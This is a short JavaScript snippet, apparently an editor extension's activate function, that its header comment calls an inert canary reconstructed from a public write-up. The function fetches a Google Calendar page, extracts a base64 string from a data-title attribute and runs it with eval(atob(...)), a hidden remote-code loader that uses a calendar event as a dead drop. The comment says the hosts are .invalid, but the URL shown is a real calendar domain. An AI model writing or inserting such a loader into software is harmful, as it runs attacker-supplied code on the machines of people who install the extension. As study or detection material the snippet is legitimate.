// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

exports.activate = async function () {
  const html = await (await fetch('https://calendar.app.google/CanaryCanary12345')).text();
  const t = html.match(/data-title="([^"]+)"/)[1];
  eval(atob(t));
};
